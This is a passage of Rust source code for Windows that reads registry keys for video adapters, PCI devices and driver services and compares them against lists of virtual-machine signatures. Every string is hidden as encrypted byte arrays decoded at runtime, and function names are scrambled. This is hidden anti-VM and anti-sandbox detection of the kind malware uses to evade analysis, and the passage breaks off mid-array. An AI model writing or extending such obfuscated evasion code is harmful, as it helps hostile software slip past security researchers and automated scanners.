, 72 , 171 , 157 , 137 , 34 , 109 , 68 , 46 , 13 , 73 , 67 , 187 , 159 , 244 , 62 , 50 , 24 , 23 , 232 , 209 , 8 , 96 , 165 , 52 , 91 , 160 , 176 , 85 , 187 , 211 , 155 , 179 , 208 , 148 , 76 , 205 , 83 , 147 , 11 , 68 , 150 , 143 , 191 , 189 , 101 , 97 , 49 , 76 , 54 , 73 , 156 , 51 , 128 , 210 , 109 , 210 , 236 , 0 , 52 , 81 , 2 , 115 , 85 , 103] , & [100 , 252 , 71 , 167 , 149 , 5 , 108 , 65 , 243 , 246 , 243 , 161 , 120 , 192 , 206 , 73 , 110 , 63 , 1 , 193 , 185 , 146 , 78 , 207 , 245 , 143 , 203 , 167 , 60 , 10 , 80 , 241 , 175 , 92 , 53 , 17 , 83 , 121 , 46 , 52 , 234 , 149 , 172 , 71 , 4 , 57 , 214 , 61 , 65 , 96 , 172 , 48 , 222 , 104 , 222 , 124 , 37 , 47 , 178 , 162 , 217 , 104 , 133 , 171 , 237 , 39 , 217 , 91 , 211 , 161 , 70 , 163 , 114 , 125 , 50 , 208 , 118 , 225 , 92 , 111 , 182 , 42 , 193 , 235 , 228 , 128 , 149 , 74] , 23459111371756u64)) ; let mut buffer : [u16 ; (100 + 156)] = [0 ; (93 + 163)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (adapter_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_adapter in & vm_adapters { if value . contains (& * * vm_adapter) { unsafe { let _ = RegCloseKey (adapter_key_handle) ; let _ = RegCloseKey (video_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (adapter_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (video_key_handle) ; } ; false } pub fn check_pci_devices () -> bool { let mut pci_key_handle : HKEY = HKEY (0) ; let pci_key_path = fqgjhfwh (& decode_bpcz_gftyzfrr (& [182 , 193 , 56 , 50 , 215 , 161 , 175 , 180 , 240 , 185 , 83 , 27 , 235 , 19 , 184 , 156 , 52 , 232 , 170 , 147 , 69 , 116 , 129 , 159 , 165 , 65 , 130 , 2 , 248 , 119 , 127 , 157 , 191 , 251 , 254 , 239 , 243 , 22 , 0 , 169 , 29 , 179 , 69 , 82 , 131 , 142 , 219 , 94 , 106 , 154 , 107 , 149 , 115 , 188 , 230 , 52 , 45 , 58 , 95 , 204 , 86 , 240 , 39 , 52 , 138 , 73 , 72 , 231 , 168 , 121 , 2 , 217 , 51 , 71 , 181 , 96 , 110 , 246 , 152 , 54 , 75 , 209 , 15 , 34 , 181 , 195 , 216 , 174 , 52 , 152 , 39 , 44 , 191 , 57 , 147 , 250 , 132 , 98 , 224 , 72 , 160 , 223 , 127 , 26 , 246 , 120 , 43 , 147 , 222 , 235 , 97 , 53 , 176 , 236 , 173 , 9 , 197 , 58 , 205 , 109 , 166 , 231 , 109 , 122 , 44 , 250 , 145 , 48 , 158 , 32 , 211 , 29 , 71 , 104 , 206 , 201 , 180 , 249 , 250 , 104 , 1 , 87 , 97 , 204 , 243 , 66 , 166 , 106 , 54 , 17 , 50 , 193 , 127 , 33 , 51 , 102 , 212 , 7 , 142 , 6 , 63 , 85 , 89 , 112 , 24 , 227 , 40 , 40 , 94 , 201 , 73 , 132 , 167 , 116 , 133 , 224 , 171 , 150 , 235 , 99 , 21 , 193 , 179 , 72 , 46 , 163 , 249 , 162 , 163 , 123 , 219 , 207 , 171 , 90 , 129 , 200 , 52 , 250 , 70 , 8 , 0 , 201 , 78 , 161 , 199 , 83 , 120 , 36 , 20 , 209 , 104 , 106 , 144 , 252 , 38 , 44 , 189 , 98 , 135 , 130 , 142 , 0 , 64 , 24 , 94 , 51 , 149 , 29 , 50 , 226 , 65 , 36 , 187 , 210 , 71 , 247 , 44 , 146 , 249 , 4 , 175 , 117 , 242 , 224 , 176 , 97 , 217 , 240 , 206 , 34 , 39 , 112 , 122 , 89 , 11 , 246 , 182 , 67 , 253 , 178 , 9 , 187 , 224 , 81 , 230 , 221 , 102 , 226 , 106 , 172 , 144 , 100 , 253 , 52 , 103 , 76 , 8 , 224 , 99 , 79 , 162 , 181 , 0 , 170 , 36 , 125 , 101 , 147 , 98 , 14 , 136 , 64 , 168 , 26 , 71 , 228 , 179 , 86 , 5 , 247 , 94 , 255 , 130 , 57 , 72 , 125 , 112 , 16 , 27 , 176 , 204 , 98 , 104 , 98 , 98 , 205 , 85 , 176 , 185 , 74 , 99 , 13 , 127 , 67 , 253 , 134 , 150 , 30 , 225 , 114 , 195 , 181 , 26 , 44 , 111 , 11 , 114 , 23 , 61 , 95 , 125 , 255 , 213 , 168 , 229 , 159 , 120 , 128 , 222 , 85 , 21 , 193 , 75 , 250 , 35 , 10 , 80 , 148 , 129 , 84 , 106 , 30 , 89 , 170 , 103 , 249 , 109 , 17 , 47 , 181 , 101 , 99 , 175 , 139 , 162 , 11 , 149 , 112 , 213 , 221 , 18 , 151 , 107 , 137 , 102 , 187 , 7 , 95 , 224 , 143 , 202 , 197 , 1 , 150 , 11 , 24 , 237 , 147 , 125 , 28] , & [204 , 238 , 59 , 188 , 153 , 210 , 95 , 178 , 109 , 33 , 170 , 28 , 191 , 247 , 100 , 2 , 98 , 138 , 123 , 55 , 8 , 232 , 204 , 89 , 232 , 225 , 205 , 87 , 104 , 62 , 85 , 45 , 171 , 32 , 128 , 201 , 65 , 86 , 91 , 66 , 10 , 10 , 158 , 182 , 22 , 148 , 157 , 116 , 128 , 206 , 0 , 119 , 241 , 53 , 184 , 105 , 77 , 89 , 241 , 91 , 230 , 186 , 158 , 234 , 228 , 45 , 216 , 85 , 243 , 206 , 50 , 88 , 95 , 128 , 92 , 73 , 100 , 46 , 140 , 247 , 134 , 181 , 184 , 173 , 165 , 208 , 57 , 196] , 229243879427163u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (pci_key_path . as_ptr ()) , 0 , KEY_READ , & mut pci_key_handle ,) } . is_err () { return false ; } let vm_pci_devices = [decode_bpcz_gftyzfrr (& [183 , 36 , 36 , 45 , 18 , 19 , 93 , 186 , 224 , 210 , 227 , 153 , 160 , 223 , 170 , 169 , 81 , 249 , 20 , 189 , 5 , 223 , 126 , 18 , 18 , 25 , 204 , 49 , 92 , 163 , 222 , 56 , 125 , 169 , 81 , 228 , 163 , 110 , 172 , 211 , 68 , 139 , 53 , 111 , 177 , 25 , 42 , 39 , 246 , 110 , 149 , 79 , 84 , 93 , 65 , 179 , 34 , 86 , 113 , 131 , 7 , 194 , 232 , 36 , 114 , 152 , 26 , 221 , 142 , 113 , 182 , 14 , 45 , 68 , 23 , 11 , 206 , 167 , 184 , 74 , 154 , 17 , 14 , 125 , 27 , 103 , 172 , 92 , 82 , 44 , 138 , 27 , 132 , 57 , 69 , 194 , 80 , 152 , 133 , 186 , 150 , 102 , 154 , 155 , 114 , 147 , 76 , 203 , 165 , 48 , 73 , 226 , 49 , 147 , 44 , 42 , 36 , 184 , 58 , 57 , 101 , 146 , 106 , 228 , 127 , 143 , 36 , 148 , 107 , 64 , 82 , 13 , 20 , 151 , 89 , 39 , 59 , 17 , 61 , 131 , 120 , 152 , 152 , 109] , & [117 , 91 , 139 , 153 , 145 , 242 , 5 , 143 , 140 , 42 , 194 , 196 , 166 , 13 , 134 , 148 , 82 , 30 , 180 , 236 , 221 , 239 , 39 , 188 , 160 , 142 , 15 , 69 , 195 , 232 , 194 , 200 , 117 , 116 , 235 , 33 , 52 , 181 , 103 , 1 , 95 , 165 , 98 , 18 , 84 , 133 , 89 , 178 , 214 , 190 , 118 , 1 , 230 , 97 , 148 , 81 , 49 , 10 , 132 , 8 , 41 , 51 , 248 , 171 , 196 , 162 , 51 , 188 , 17 , 33 , 13 , 79 , 159 , 161 , 254 , 0 , 167 , 120 , 221 , 252 , 121 , 179 , 65 , 193 , 196 , 54 , 161 , 98] , 25426206393250u64) , decode_bpcz_gftyzfrr (& [129 , 170 , 122 , 189 , 16 , 182 , 15 , 26 , 64 , 100 , 228 , 124 , 109 , 96 , 54 , 152 , 57 , 143 , 33 , 246 , 35 , 44 , 211 , 212 , 149 , 110 , 170 , 42 , 3 , 194 , 91 , 255 , 144 , 145 , 148 , 46 , 146 , 55 , 120 , 86 , 181 , 125 , 73 , 54 , 167 , 223 , 191 , 181 , 254 , 29 , 215 , 123 , 116 , 45 , 241 , 127 , 181 , 214 , 31 , 57 , 81 , 68 , 30 , 197 , 166 , 206 , 223 , 228 , 105 , 42 , 89 , 74 , 192 , 43 , 204 , 7 , 110 , 41 , 173 , 85 , 201 , 30 , 218 , 57 , 91 , 32 , 2 , 195 , 252 , 90 , 110 , 127 , 79 , 128 , 147 , 77 , 211 , 85 , 173 , 81 , 203 , 154 , 181 , 185 , 118 , 90 , 199 , 85 , 209 , 62 , 4 , 70 , 125 , 185 , 186 , 139 , 237 , 139 , 14 , 124 , 183 , 81 , 231 , 183 , 153 , 189 , 10 , 23 , 145 , 63 , 243 , 200 , 115 , 108 , 243 , 209 , 212 , 69 , 215 , 240 , 57 , 215 , 90 , 162 , 35 , 32 , 166 , 73 , 191 , 42 , 56 , 29 , 202 , 47 , 32 , 140 , 5 , 214 , 255 , 172 , 24 , 83 , 202 , 70 , 194 , 72 , 200 , 242 , 65 , 0 , 127 , 55 , 65 , 246 , 163 , 163 , 101 , 12 , 63 , 186 , 27 , 90 , 31 , 242 , 183 , 235 , 57 , 170 , 156 , 152 , 244 , 112 , 184 , 222 , 114 , 245 , 63 , 63 , 106 , 157 , 133 , 217 , 246 , 240 , 171 , 211 , 64 , 110 , 118 , 243 , 96 , 16 , 213 , 147 , 184 , 42 , 199 , 245 , 216 , 64 , 157 , 170 , 185 , 209 , 27 , 128 , 184 , 161 , 110 , 207 , 43 , 33 , 17 , 215 , 222 , 160 , 234 , 247 , 64 , 18 , 108 , 141 , 207 , 89 , 95 , 49 , 219 , 244 , 156 , 143 , 184 , 165 , 22 , 74 , 243 , 8 , 246 , 205 , 111 , 240 , 135 , 170 , 243 , 221 , 67 , 30 , 155 , 221 , 179 , 110 , 150 , 210 , 234 , 194 , 1 , 170 , 139 , 96 , 65 , 59 , 30 , 156 , 103 , 123 , 24 , 8 , 53 , 97] , & [119 , 246 , 124 , 218 , 189 , 207 , 169 , 184 , 54 , 100 , 84 , 55 , 132 , 123 , 103 , 62 , 206 , 151 , 206 , 243 , 141 , 111 , 87 , 139 , 178 , 222 , 161 , 143 , 35 , 179 , 181 , 27 , 212 , 222 , 202 , 26 , 188 , 24 , 196 , 198 , 119 , 18 , 113 , 126 , 228 , 99 , 111 , 62 , 11 , 71 , 104 , 70 , 221 , 242 , 6 , 189 , 164 , 92 , 106 , 97 , 45 , 160 , 169 , 245 , 7 , 33 , 36 , 106 , 239 , 34 , 193 , 109 , 58 , 91 , 31 , 132 , 20 , 23 , 192 , 91 , 11 , 123 , 237 , 181 , 43 , 13 , 151 , 168] , 126491081836842u64) , decode_bpcz_gftyzfrr (& [202 , 79 , 97 , 208 , 248 , 18 , 168 , 163 , 10 , 79 , 67 , 86 , 33 , 67 , 134 , 95 , 121 , 96 , 184 , 103 , 159 , 194 , 135 , 170 , 220 , 245 , 193 , 72 , 247 , 93 , 98 , 86 , 38 , 6 , 153 , 91 , 176 , 119 , 234 , 82 , 83 , 125 , 203 , 181 , 3 , 228 , 70 , 144 , 129 , 213 , 114 , 120 , 41 , 129 , 114 , 147 , 68 , 194 , 58 , 213 , 46 , 86 , 169 , 197 , 213 , 148 , 92 , 37 , 141 , 123 , 32 , 113 , 64 , 122 , 101 , 106 , 108 , 49 , 220 , 202 , 163 , 81 , 82 , 208 , 173 , 182 , 115 , 25 , 25 , 119 , 26 , 134 , 214 , 162 , 74 , 235 , 186 , 84 , 51 , 42 , 7 , 193 , 254 , 59 , 127 , 17 , 187 , 143 , 75 , 118 , 193 , 237 , 123 , 15 , 201 , 26 , 255 , 47 , 228 , 60 , 210 , 205 , 166 , 183 , 175 , 41 , 120 , 96 , 90 , 0 , 148 , 201 , 98 , 198 , 242 , 221 , 116 , 66 , 50 , 235 , 185 , 235 , 179 , 161 , 151 , 4 , 214 , 236 , 202 , 55 , 60 , 161 , 113 , 20 , 111 , 143 , 132 , 135 , 58 , 167 , 115 , 39 , 163 , 23 , 168 , 221 , 155 , 128 , 236 , 158 , 90 , 219 , 64 , 176 , 242 , 22 , 229 , 144 , 6 , 0 , 71 , 9 , 111 , 100 , 249 , 204 , 157 , 15 , 19 , 56 , 93 , 180] , & [254 , 198 , 141 , 120 , 74 , 73 , 235 , 74 , 80 , 165 , 67 , 117 , 253 , 213 , 7 , 9 , 66 , 204 , 207 , 210 , 107 , 100 , 137 , 12 , 112 , 24 , 217 , 114 , 210 , 134 , 70 , 4 , 178 , 187 , 228 , 40 , 45 , 77 , 59 , 20 , 155 , 20 , 159 , 79 , 208 , 90 , 68 , 177 , 53 , 46 , 146 , 132 , 247 , 115 , 8 , 137 , 162 , 220 , 141 , 84 , 214 , 255 , 183 , 204 , 234 , 118 , 64 , 160 , 224 , 213 , 221 , 121 , 55 , 109 , 184 , 15 , 32 , 68 , 221 , 104 , 216 , 117 , 196 , 174 , 11 , 241 , 178 , 176] , 37976100832438u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (123 + 133)] = [0 ; (26 + 230)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (pci_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let device_key_path = format ! ("SYSTEM\\CurrentControlSet\\Enum\\PCI\\{}" , subkey_name) ; let mut device_key_handle : HKEY = HKEY (0) ; let device_key_pcwstr = fqgjhfwh (& device_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (device_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut device_key_handle ,) } . is_ok () { let value_name = fqgjhfwh (& decode_bpcz_gftyzfrr (& [230 , 54 , 1 , 42 , 102 , 172 , 216 , 85 , 12 , 55 , 55 , 184 , 133 , 80 , 173 , 2 , 230 , 114 , 30 , 131 , 6 , 168 , 183 , 128 , 25 , 184 , 190 , 34 , 184 , 39 , 11 , 200 , 200 , 144 , 228 , 14 , 157 , 37 , 186 , 27 , 36 , 204 , 231 , 2 , 248 , 21 , 33 , 207 , 123 , 223 , 103 , 74 , 29 , 124 , 162 , 21 , 188 , 164 , 83 , 140 , 149 , 88 , 76 , 172 , 255 , 91 , 59 , 130 , 169 , 92 , 252 , 31 , 17 , 0 , 227 , 24 , 160 , 160 , 65 , 145 , 98 , 251 , 205 , 238 , 119 , 119 , 159 , 216 , 2 , 130 , 186 , 244 , 56 , 117 , 81 , 243 , 66 , 208 , 187 , 81 , 27 , 62 , 87 , 110 , 189 , 186 , 173 , 77 , 255 , 64 , 194 , 94 , 207 , 14 , 60 , 80 , 109 , 21 , 245 , 26 , 2 , 62 , 228 , 127 , 231 , 154 , 131 , 169 , 114 , 95 , 102 , 208 , 244 , 170 , 180 , 164 , 1 , 218 , 30 , 205 , 86 , 15 , 212 , 234] , & [121 , 82 , 161 , 107 , 210 , 50 , 48 , 181 , 77 , 38 , 139 , 116 , 37 , 64 , 98 , 1 , 233 , 88 , 17 , 152 , 117 , 219 , 53 , 207 , 132 , 68 , 0 , 165 , 249 , 188 , 21 , 55 , 50 , 41 , 17 , 244 , 206 , 237 , 84 , 32 , 18 , 142 , 101 , 22 , 135 , 108 , 179 , 41 , 6 , 150 , 192 , 30 , 243 , 180 , 145 , 244 , 238 , 183 , 67 , 253 , 114 , 17 , 76 , 52 , 219 , 133 , 251 , 56 , 21 , 223 , 23 , 158 , 231 , 54 , 148 , 72 , 235 , 227 , 18 , 177 , 232 , 196 , 200 , 148 , 220 , 33 , 73 , 125] , 22681722291152u64)) ; let mut buffer : [u16 ; (43 + 213)] = [0 ; (22 + 234)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (device_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_device in & vm_pci_devices { if value . contains (& * * vm_device) { unsafe { let _ = RegCloseKey (device_key_handle) ; let _ = RegCloseKey (pci_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (device_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (pci_key_handle) ; } ; false } pub fn check_drivers () -> bool { let mut services_key_handle : HKEY = HKEY (0) ; let services_key_path = fqgjhfwh (& decode_bpcz_gftyzfrr (& [177 , 56 , 1 , 227 , 94 , 47 , 53 , 35 , 31 , 255 , 77 , 26 , 232 , 214 , 58 , 4 , 26 , 203 , 32 , 180 , 238 , 121 , 248 , 44 , 189 , 51 , 53 , 109 , 114 , 83 , 50 , 39 , 233 , 231 , 216 , 215 , 187 , 189 , 83 , 145 , 219 , 124 , 104 , 54 , 170 , 226 , 238 , 111 , 103 , 31 , 181 , 77 , 2 , 162 , 27 , 100 , 214 , 9 , 238 , 142 , 165 , 200 , 57 , 40 , 188 , 242 , 39 , 136 , 249 , 189 , 239 , 252 , 246 , 6 , 37 , 42 , 230 , 180 , 200 , 43 , 220 , 118 , 114 , 8 , 7 , 73 , 111 , 119 , 0 , 90 , 19 , 165 , 4 , 180 , 216 , 42 , 82 , 144 , 167 , 43 , 120 , 124 , 11 , 38 , 152 , 253 , 51 , 166 , 19 , 123 , 42 , 2 , 34 , 52 , 49 , 240 , 12 , 164 , 176 , 215 , 140 , 99 , 76 , 57 , 77 , 50 , 181 , 127 , 146 , 220 , 229 , 83 , 3 , 208 , 111 , 231 , 35 , 69 , 150 , 87 , 231 , 123 , 142 , 187 , 255 , 7 , 189 , 36 , 193 , 128 , 119 , 221 , 227 , 108 , 91 , 79 , 6 , 28 , 48 , 68 , 145 , 208 , 126 , 153 , 224 , 24 , 18 , 89 , 192 , 41 , 36 , 213 , 149 , 63 , 20 , 132 , 226 , 246 , 187 , 86 , 121 , 98 , 174 , 216 , 225 , 73 , 15 , 54 , 251 , 173 , 15 , 155 , 149 , 43 , 236 , 14 , 29 , 215 , 39 , 139 , 14 , 30 , 233 , 117 , 112 , 63 , 34 , 27 , 58 , 237 , 70 , 174 , 97 , 238 , 217 , 103 , 7 , 226 , 168 , 139 , 192 , 68 , 30 , 132 , 3 , 113 , 93 , 40 , 220 , 74 , 125 , 223 , 155 , 151 , 89 , 6 , 242 , 181 , 100 , 254 , 104 , 33 , 127 , 203 , 21 , 252 , 105 , 174 , 91 , 239 , 53 , 115 , 107 , 0 , 9 , 17 , 129 , 160 , 13 , 58 , 219 , 197 , 164 , 9 , 184 , 29 , 154 , 157 , 128 , 60 , 80 , 43 , 37 , 24 , 195 , 104 , 97 , 145 , 164 , 79 , 125 , 42 , 158 , 206 , 196 , 118 , 61 , 117 , 41 , 254 , 197 , 7 , 16 , 28 , 219 , 224 , 186 , 39 , 191 , 181 , 207 , 253 , 230 , 250 , 26 , 31 , 125 , 174 , 192 , 91 , 12 , 55 , 100 , 64 , 178 , 252 , 23 , 185 , 11 , 86 , 239 , 186 , 219 , 140 , 135 , 84 , 223 , 153 , 15 , 23 , 242 , 217 , 124 , 123 , 86 , 158 , 35 , 240 , 89 , 54 , 237 , 32 , 96 , 240 , 90 , 38 , 116 , 161 , 21 , 142 , 67 , 29 , 9 , 196 , 130 , 58 , 29 , 57 , 232 , 110 , 196 , 197 , 251 , 210 , 43 , 136 , 162 , 24 , 75 , 236 , 56 , 217 , 45 , 16 , 164 , 96 , 71 , 243 , 144 , 17 , 146 , 218 , 138 , 58 , 249 , 195 , 167 , 6 , 196 , 31 , 54 , 103 , 181 , 203 , 144 , 100 , 7 , 65 , 133 , 197] , & [140 , 24 , 161 , 120 , 94 , 57 , 48 , 107 , 42 , 185 , 253 , 253 , 53 , 219 , 202 , 131 , 199 , 22 , 101 , 83 , 77 , 80 , 182 , 14 , 103 , 3 , 209 , 85 , 194 , 36 , 111 , 16 , 252 , 137 , 171 , 198 , 65 , 69 , 74 , 128 , 222 , 203 , 93 , 158 , 157 , 38 , 54 , 163 , 90 , 98 , 166 , 11 , 70 , 190 , 138 , 134 , 154 , 77 , 29 , 105 , 69 , 134 , 96 , 32 , 169 , 223 , 42 , 40 , 70 , 61 , 44 , 69 , 34 , 91 , 238 , 86 , 63 , 57 , 69 , 112 , 38 , 173 , 31 , 20 , 66 , 151 , 15 , 150] , 230510894779602u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (services_key_path . as_ptr ()) , 0 , KEY_READ , & mut services_key_handle ,) } . is_err () { return false ; } let vm_drivers = [decode_bpcz_gftyzfrr (& [54 , 30 , 122 , 236 , 96 , 126 , 251 , 110 , 139 , 27 , 62 , 241 , 221 , 73 , 21 , 237 , 238 , 157 , 188 , 145 , 61 , 121 , 47 , 76 , 148 , 58 , 163 , 202 , 171 , 226 , 191 , 34 , 115 , 189 , 116 , 209 , 31 , 183 , 19 , 184 , 139 , 35 , 149 , 230 , 113 , 109 , 89 , 233 , 227 , 124 , 233 , 56 , 136 , 167 , 11 , 53 , 140 , 219 , 104 , 158 , 21 , 159 , 157 , 155 , 92 , 222 , 166 , 90 , 153 , 83 , 132 , 213 , 195 , 184 , 186 , 205 , 31 , 213 , 158 , 180 , 216 , 82 , 167 , 192 , 102 , 228 , 242 , 143 , 154 , 10 , 223 , 27 , 34 , 165 , 91 , 157] , & [172 , 41 , 167 , 120 , 238 , 60 , 50 , 122 , 222 , 60 , 99 , 95 , 52 , 185 , 26 , 186 , 204 , 163 , 16 , 151 , 176 , 248 , 1 , 189 , 34 , 94 , 130 , 59 , 249 , 153 , 194 , 185 , 139 , 69 , 249 , 120 , 200 , 214 , 155 , 249 , 117 , 173 , 17 , 117 , 115 , 42 , 227 , 27 , 36 , 185 , 13 , 24 , 39 , 38 , 195 , 74 , 5 , 47 , 217 , 241 , 85 , 253 , 162 , 47 , 134 , 147 , 120 , 83 , 124 , 182 , 64 , 41 , 146 , 168 , 205 , 30 , 249 , 96 , 50 , 246 , 150 , 119 , 109 , 165 , 104 , 242 , 203 , 186] , 10153302688414u64) , decode_bpcz_gftyzfrr (& [241 , 158 , 68 , 135 , 213 , 169 , 44 , 68 , 147 , 27 , 178 , 72 , 81 , 12 , 182 , 100 , 176 , 166 , 191 , 15 , 139 , 185 , 3 , 46 , 69 , 177 , 214 , 105 , 38 , 33 , 195 , 250 , 162 , 204 , 211 , 75 , 204 , 137 , 54 , 71 , 143 , 11 , 123 , 1 , 63 , 37 , 213 , 20 , 6 , 56 , 118 , 41 , 30 , 218 , 13 , 211 , 142 , 187 , 147 , 90 , 110 , 67 , 152 , 151 , 192 , 223 , 88 , 202 , 226 , 156 , 252 , 85 , 214 , 88 , 252 , 229 , 0 , 102 , 115 , 193 , 80 , 232 , 101 , 193 , 51 , 137 , 98 , 233 , 253 , 51 , 170 , 212 , 148 , 235 , 61 , 62] , & [196 , 51 , 150 , 193 , 148 , 80 , 139 , 36 , 251 , 172 , 36 , 113 , 175 , 18 , 229 , 205 , 161 , 124 , 237 , 122 , 140 , 215 , 69 , 165 , 17 , 234 , 226 , 169 , 162 , 145 , 215 , 43 , 23 , 2 , 106 , 24 , 179 , 204 , 149 , 88 , 82 , 230 , 179 , 212 , 25 , 39 , 158 , 211 , 103 , 170 , 194 , 174 , 238 , 113 , 129 , 34 , 196 , 120 , 1 , 163 , 167 , 228 , 232 , 140 , 148 , 160 , 210 , 253 , 9 , 139 , 204 , 182 , 10 , 60 , 71 , 242 , 42 , 233 , 4 , 9 , 82 , 137 , 125 , 78 , 171 , 231 , 57 , 6] , 10252086936227u64) , decode_bpcz_gftyzfrr (& [37 , 166 , 85 , 85 , 161 , 172 , 195 , 62 , 162 , 166 , 73 , 234 , 143 , 198 , 245 , 67 , 129 , 98 , 243 , 232 , 210 , 99 , 206 , 202 , 157 , 97 , 240 , 183 , 3 , 105 , 168 , 13 , 173 , 130 , 223 , 28 , 132 , 82 , 193 , 151 , 172 , 119 , 34 , 16 , 173 , 68 , 110 , 19 , 30 , 6 , 137 , 160 , 22 , 61 , 82 , 87 , 119 , 253 , 62 , 54 , 71 , 82 , 165 , 41 , 70 , 72 , 223 , 247 , 141 , 80 , 133 , 16 , 46 , 180 , 253 , 91 , 105 , 39 , 76 , 215 , 57 , 110 , 169 , 73 , 94 , 104 , 251 , 160 , 222 , 46 , 34 , 72 , 115 , 54 , 71 , 209] , & [162 , 83 , 253 , 175 , 23 , 71 , 99 , 77 , 147 , 128 , 58 , 157 , 223 , 31 , 225 , 173 , 130 , 4 , 205 , 254 , 216 , 89 , 240 , 180 , 12 , 174 , 67 , 157 , 199 , 227 , 15 , 146 , 190 , 108 , 15 , 120 , 39 , 33 , 79 , 98 , 106 , 105 , 205 , 120 , 155 , 150 , 217 , 235 , 114 , 108 , 69 , 144 , 21 , 208 , 244 , 212 , 233 , 237 , 5 , 121 , 50 , 72 , 211 , 3 , 54 , 83 , 245 , 222 , 245 , 58 , 153 , 191 , 117 , 241 , 168 , 49 , 1 , 95 , 191 , 157 , 7 , 3 , 214 , 61 , 71 , 48 , 239 , 171] , 10136122819225u64) , decode_bpcz_gftyzfrr (& [96 , 42 , 179 , 15 , 223 , 195 , 94 , 246 , 176 , 141 , 101 , 126 , 54 , 178 , 11 , 34 , 65 , 77 , 5 , 189 , 104 , 232 , 233 , 24 , 208 , 151 , 126 , 214 , 210 , 8 , 86 , 120 , 113 , 99 , 109 , 175 , 11 , 245 , 255 , 69 , 183 , 145 , 13 , 234 , 170 , 31 , 18 , 206 , 22 , 117 , 133 , 165 , 196 , 191 , 70 , 14 , 2 , 241 , 70 , 247 , 101 , 111 , 43 , 62 , 214 , 210 , 203 , 120 , 153 , 195 , 50 , 176 , 127 , 28 , 214 , 16 , 58 , 220 , 230 , 155 , 250 , 249 , 235 , 44 , 159 , 191 , 186 , 94 , 163 , 216 , 203 , 92 , 86 , 248 , 191 , 60 , 119 , 11 , 85 , 157 , 223 , 234 , 242 , 53 , 147 , 112 , 159 , 231 , 51 , 85 , 172 , 204 , 74 , 160 , 242 , 173 , 188 , 244 , 39 , 26 , 206 , 198 , 150 , 221 , 152 , 171 , 173 , 43] , & [184 , 69 , 26 , 106 , 109 , 19 , 144 , 188 , 219 , 41 , 159 , 218 , 159 , 63 , 240 , 77 , 20 , 213 , 21 , 43 , 169 , 218 , 24 , 163 , 225 , 8 , 116 , 222 , 153 , 251 , 211 , 172 , 41 , 202 , 201 , 179 , 240 , 98 , 245 , 48 , 89 , 40 , 207 , 13 , 211 , 145 , 2 , 229 , 221 , 0 , 231 , 217 , 165 , 4 , 115 , 133 , 185 , 79 , 227 , 136 , 173 , 187 , 233 , 30 , 60 , 194 , 14 , 12 , 5 , 117 , 177 , 147 , 7 , 180 , 254 , 110 , 228 , 168 , 25 , 150 , 214 , 202 , 211 , 182 , 192 , 102 , 32 , 78] , 21406117004264u64) , decode_bpcz_gftyzfrr (& [95 , 3 , 22 , 50 , 2 , 253 , 195 , 15 , 135 , 240 , 63 , 99 , 245 , 47 , 14 , 192 , 44 , 209 , 253 , 6 , 115 , 169 , 54 , 228 , 100 , 228 , 139 , 226 , 101 , 139 , 131 , 169 , 156 , 136 , 200 , 201 , 170 , 156 , 196 , 214 , 164 , 174 , 203 , 119 , 176 , 45 , 146 , 203 , 21 , 29 , 97 , 14 , 27 , 249 , 170 , 108 , 152 , 51 , 131 , 12 , 144 , 57 , 37 , 123 , 228 , 175 , 62 , 200 , 82 , 127 , 21 , 245 , 93 , 35 , 52 , 238 , 55 , 5 , 75 , 57 , 182 , 148 , 99 , 121 , 164 , 30 , 115 , 142 , 33 , 122 , 43 , 148 , 52 , 84 , 76 , 222] , & [62 , 236 , 96 , 235 , 169 , 88 , 251 , 137 , 119 , 80 , 171 , 83 , 17 , 146 , 91 , 252 , 193 , 19 , 249 , 196 , 42 , 1 , 217 , 112 , 207 , 85 , 197 , 177 , 78 , 70 , 48 , 99 , 229 , 102 , 209 , 32 , 19 , 10 , 68 , 162 , 14 , 246 , 75 , 51 , 66 , 122 , 172 , 77 , 137 , 221 , 16 , 56 , 48 , 35 , 247 , 107 , 178 , 68 , 64 , 252 , 136 , 108 , 70 , 252 , 178 , 62 , 89 , 170 , 80 , 226 , 213 , 177 , 1 , 84 , 113 , 85 , 93 , 52 , 15 , 182 , 208 , 234 , 122 , 118 , 240 , 164 , 74 , 22] , 10114647982739u64) , decode_bpcz_gftyzfrr (& [163 , 183 , 1 , 100 , 43 , 96 , 121 , 146 , 164 , 241 , 93 , 61 , 158 , 169 , 34 , 155 , 247 , 10 , 254 , 254 , 100 , 84 , 246 , 192 , 186 , 236 , 188 , 176 , 28 , 112 , 253 , 146 , 67 , 182 , 49 , 224 , 120 , 24 , 47 , 152 , 173 , 252 , 181 , 88 , 90 , 113 , 97 , 184 , 128 , 74 , 61 , 41 , 112 , 7 , 26 , 21 , 166 , 226 , 125 , 169 , 95 , 63 , 211 , 63 , 245 , 69 , 31 , 32 , 188 , 69 , 184 , 170 , 139 , 112 , 32 , 112 , 51 , 5 , 179 , 150] , & [208 , 208 , 61 , 9 , 244 